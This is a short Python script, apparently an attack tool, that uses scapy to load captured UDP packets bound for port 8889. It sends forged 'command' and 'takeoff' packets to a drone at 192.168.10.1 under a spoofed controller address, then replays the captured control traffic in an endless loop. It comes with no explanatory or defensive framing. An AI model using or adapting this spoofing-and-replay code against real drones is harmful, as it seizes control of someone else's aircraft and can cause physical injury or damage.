from scapy.all import *

packets = rdpcap("actions.pcap")

udp_packets = []
for pkt in packets:
    if UDP in pkt and pkt[UDP].dport == 8889:
        udp_packets.append(pkt)

print("loading complete")

drone_ip = "192.168.10.1"
controller_ip = "192.168.10.18" 

init_packet_command = IP(src=controller_ip, dst=drone_ip)/UDP(sport=8889, dport=8889)/"command"
init_packet_takeoff = IP(src=controller_ip, dst=drone_ip)/UDP(sport=8889, dport=8889)/"takeoff"
send(init_packet_command)
send(init_packet_takeoff)

time.sleep(2)
while True:
    for pkt in udp_packets:
        new_packet = IP(src=controller_ip, dst=drone_ip)/UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport)/pkt[Raw].load
        send(new_packet)
